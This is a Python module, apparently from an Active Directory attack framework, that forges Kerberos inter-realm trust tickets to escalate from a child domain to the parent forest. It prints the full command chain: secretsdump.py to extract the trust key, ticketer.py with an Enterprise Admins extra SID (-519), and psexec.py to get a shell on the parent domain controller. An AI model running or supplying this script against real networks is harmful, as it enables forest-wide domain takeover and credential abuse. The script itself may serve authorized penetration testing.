"""Inter-realm trust ticket  -  forge referral tickets for cross-domain access."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.trust.trust_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_forge"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001", "T1134.005"],
}


def run(args: Any) -> int:
    child_domain = args.domain
    parent_domain = getattr(args, "parent_domain", None)
    trust_key = getattr(args, "trust_key", None)
    child_sid = getattr(args, "child_sid", None)
    parent_sid = getattr(args, "parent_sid", None)
    impersonate = getattr(args, "impersonate", "Administrator")

    if not parent_domain or not trust_key:
        print("[!] --parent-domain and --trust-key required", file=sys.stderr)
        print("[*] Get trust key: secretsdump.py -just-dc-user '<child>$'")
        return 1

    if not child_sid:
        print("[!] --child-sid required (child domain SID)", file=sys.stderr)
        return 1

    extra_sid = "{}-519".format(parent_sid or "<parent-SID>")

    print("[*] Inter-realm trust ticket:")
    print(f"  Child domain:  {child_domain} ({child_sid})")
    print("  Parent domain: {} ({})".format(parent_domain, parent_sid or "?"))
    print(f"  Trust key:     {trust_key[:16]}...")
    print(f"  Extra SID:     {extra_sid} (Enterprise Admins)")
    print(f"  Impersonate:   {impersonate}")

    print("\n[*] Forge command:")
    print(f"  ticketer.py -nthash {trust_key} -domain-sid {child_sid} "
          f"-domain {child_domain} -extra-sid {extra_sid} -spn krbtgt/{parent_domain} {impersonate}")

    print("\n[*] Then use the ticket:")
    print(f"  export KRB5CCNAME={impersonate}.ccache")
    print(f"  psexec.py -k -no-pass {impersonate}@dc.{parent_domain}")
    return 0
